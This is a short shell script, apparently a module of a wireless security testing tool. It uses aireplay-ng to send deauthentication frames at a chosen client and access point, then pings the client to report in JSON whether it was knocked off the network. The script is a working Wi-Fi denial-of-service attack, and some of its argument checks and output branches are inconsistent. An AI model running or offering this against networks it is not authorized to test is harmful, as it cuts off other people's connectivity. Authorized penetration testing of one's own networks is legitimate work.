#!/bin/sh

if [ $# -ne 5 ]; then
    output=$(jq -n \
        --arg status "false" \
        --arg output "Usage: $0 <monitor_interface> <device_mac> <access_point_mac> <timer>" \
        '{status: $status, output: $output}')
    exit 0
fi
# echo $#

# output=$(jq -n \
#         --arg status "false" \
#         --arg output "$output" \
#         '{status: $status, output: $output}')
#     echo "$output"

monitor_interface=$1
device_mac=$2
access_point_mac=$3
timer=$4

sudo  aireplay-ng --deauth  "$timer" -c "$device_mac" -a "$access_point_mac" "$monitor_interface" &> /dev/null

    ip_addr=$5
	ttlvalue="$(ping -c "$timer" "$ip_addr" | grep -E 'timed out|Unreachable')"

    sleep 10
    # echo $ttlvalue
        if [ "$ttlvalue" != '' ]
        then
                # echo "Vulnerable to Deauthentication DoS Attack"
                output=$(jq -n \
                     --arg status "true" \
                     --arg output "Deauthentication attack completed" \
                     '{status: $status, output: $output}')
                     echo "$output"
        else
                # echo "Not Vulnerable to Deauthentication DoS AttackS"
                output=$(jq -n \
                     --arg status "false" \
                    --arg output "Usage: $0 <monitor_interface> <device_mac> <access_point_mac> <timer>" \
                    '{status: $status, output: $output}')
                    echo "$output"
                    exit 0
        fi